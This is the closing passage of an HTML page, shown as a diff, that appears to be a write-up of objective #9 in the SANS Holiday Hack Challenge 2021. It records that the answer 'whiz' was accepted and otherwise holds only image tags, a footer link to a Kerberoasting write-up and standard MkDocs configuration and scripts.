+Thank you for helping Santa complete this investigation! Santa says you're a <b>whiz</b> <br>
+We submit <b>whiz</b> as the answer for the objective #9 and Its accepted. </p>
+<p><img src="../../images/hhc2021/image117.png" alt="drawing" width="800px"/>
+<img src="../../images/hhc2021/image118.png" alt="drawing" width="400px"/></p>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../8%29%20Kerberoasting%20on%20an%20Open%20Fire/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 8) Kerberoasting on an Open Fire" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              8) Kerberoasting on an Open Fire
+            </div>
+          </div>
+        </a>
+      
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.22074ed6.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.01de222e.min.js"></script>
+      
+    
+  </body>
+</html>
